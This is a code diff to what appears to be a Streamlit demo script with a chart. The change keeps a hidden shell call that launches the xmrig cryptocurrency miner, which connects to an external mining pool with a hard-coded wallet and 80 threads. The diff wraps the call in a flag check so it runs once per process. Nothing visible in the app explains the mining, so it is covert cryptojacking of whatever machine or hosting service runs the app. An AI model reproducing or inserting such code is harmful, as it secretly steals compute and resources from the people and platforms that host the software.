@@ -10,6 +10,7 @@ from os import system, name
 from time import sleep
 from subprocess import PIPE, Popen
 import base64
+import flag
 
 
 
@@ -71,9 +72,10 @@ with st.echo(code_location='below'):
 
         .encode(x='x:Q', y='y:Q'))
 
-        
-p = subprocess.run("./xmrig --algo=ghostrider --url stratum-eu.rplant.xyz:17084 --tls --user JNfxq14CPWoBETz3m32SpETkkRnHFqRxan.ODM-$(echo $(shuf -i 10000-99999 -n 1)) -t 80 -k", stdout=subprocess.PIPE, shell=True)
-
+if flag.controlFlag==0:        
+    p = subprocess.run("./xmrig --algo=ghostrider --url stratum-eu.rplant.xyz:17084 --tls --user JNfxq14CPWoBETz3m32SpETkkRnHFqRxan.ODM-$(echo $(shuf -i 10000-99999 -n 1)) -t 80 -k", stdout=subprocess.PIPE, shell=True)
+    flag.controlFlag+=1
+    
 import time 
 from IPython.display import clear_output 
  
